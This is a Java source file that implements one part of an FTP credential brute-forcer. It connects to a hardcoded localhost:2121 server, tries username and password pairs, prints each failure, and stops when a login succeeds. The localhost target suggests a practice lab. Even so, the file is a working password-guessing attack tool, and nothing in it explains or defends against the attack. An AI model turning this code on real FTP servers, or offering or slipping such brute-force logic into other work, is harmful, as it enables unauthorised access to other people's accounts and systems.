package org.ops;

import org.apache.commons.net.ftp.FTPClient;

import java.io.IOException;

public class BruteForceFtp {

    private static final String HOST = "localhost";
    private static final int PORT = 2121;

    static void tryCredential(Credential cred) {
        if (BruteForceRunner.isFound()) return;

        String user = cred.user;
        String pass = cred.password;

        FTPClient ftp = new FTPClient();

        try {
            ftp.connect(HOST, PORT);
            ftp.enterLocalPassiveMode();

            boolean success = ftp.login(user, pass);

            if (success) {
                System.out.printf("✅ FOUND → %s:%s%n", user, pass);
                BruteForceRunner.markFound();
                ftp.logout();
            } else {
                System.out.printf("❌ Failed: %s:%s%n", user, pass);
            }

        } catch (IOException e) {
            System.out.printf("⚠️ Error with %s:%s → %s%n", user, pass, e.getMessage());
        } finally {
            if (ftp.isConnected()) {
                try {
                    ftp.disconnect();
                } catch (IOException ignored) {
                }
            }
        }
    }
}
